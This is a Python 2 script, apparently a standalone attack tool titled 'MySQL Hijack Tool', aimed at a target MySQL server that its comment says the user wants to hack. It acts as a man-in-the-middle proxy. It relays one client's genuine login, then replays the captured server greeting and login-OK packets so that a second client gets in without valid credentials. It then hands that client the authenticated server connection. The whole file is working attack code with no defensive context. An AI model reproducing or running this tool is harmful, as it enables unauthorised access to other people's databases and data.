from socket import *
import threading
import sys

HOST = '0.0.0.0'
PORT = 3306
BUFSIZ = 4096000
ADDR = (HOST,PORT)

FORWARDHOST = '10.0.0.1' # target mysql server u want to hack
FORWARDPORT = 3306
FORWARDADDR = (FORWARDHOST,FORWARDPORT)

SERVERGREETINGPACKET = ''

print 'MySQL Hijack Tool'
print 'Connecting to forward host'
tcpServerSock = socket(AF_INET,SOCK_STREAM)
tcpServerSock.connect(FORWARDADDR)
print 'Forward host connected'

tcpSerSock = socket(AF_INET,SOCK_STREAM)
tcpSerSock.bind(ADDR)
tcpSerSock.listen(5)

print 'Waiting client connection'
tcpCliSock, addr = tcpSerSock.accept()
print 'Client connected'

print 'Step 0x01: Handling Server Greeting'
SERVERGREETINGPACKET = tcpServerSock.recv(BUFSIZ)
print 'Forwarding to Client...'
tcpCliSock.send(SERVERGREETINGPACKET)
print 'Finish'

print 'Step 0x02: Handling Login Request Packet'
packet = tcpCliSock.recv(BUFSIZ)
print 'Forwarding to Server...'
tcpServerSock.send(packet)
print 'Finish'

print 'Step 0x03: Handling Login OK Packet'
LOGINOKPACKET = tcpServerSock.recv(BUFSIZ)
if(LOGINOKPACKET[4] != '\x00'):
    print 'Client failed to login!'
    sys.exit(-1)
print 'Forwarding to Client...'
tcpCliSock.send(LOGINOKPACKET)
print 'Finish'

print '--> MySQL has been hijacked, arbitrary login at', ADDR
tcpCliSock.close()

print '--> Waiting new client connection'
tcpCliSock, addr = tcpSerSock.accept()
print 'New Client connected'

print 'Step 0x04: Duplicating Server Greeting'
tcpCliSock.send(SERVERGREETINGPACKET)
print 'Finish'

print 'Step 0x05: Handling Login Request Packet'
packet = tcpCliSock.recv(BUFSIZ)
print 'Finish'

print 'Step 0x06: Duplicating Login OK Packet'
tcpCliSock.send(LOGINOKPACKET)
print 'Finish'

print '==================== WIN ===================='
print '==================== WIN ===================='
print '==================== WIN ===================='

class ClientThread(threading.Thread):
    def __init__(self, clientSocket, serverServerSocket):
        threading.Thread.__init__(self)
        self.clientSocket = clientSocket
        self.serverServerSocket = serverServerSocket
    
    def run(self):
        while True:
            data = self.clientSocket.recv(BUFSIZ)
            if not data:
                print 'Client closed'
                try:
                    self.serverServerSocket.close()
                except:
                    pass
                break
            self.serverServerSocket.send(data)

class ServerThread(threading.Thread):
    def __init__(self, clientSocket, serverServerSocket):
        threading.Thread.__init__(self)
        self.clientSocket = clientSocket
        self.serverServerSocket = serverServerSocket
    
    def run(self):
        while True:
            data = self.serverServerSocket.recv(BUFSIZ)
            if not data:
                print 'Server closed'
                try:
                    self.clientSocket.close()
                except:
                    pass
                break
            self.clientSocket.send(data)

print 'Starting Server thread and Client Thread'
ct = ClientThread(tcpCliSock, tcpServerSock)
st = ServerThread(tcpCliSock, tcpServerSock)
ct.start()
st.start()
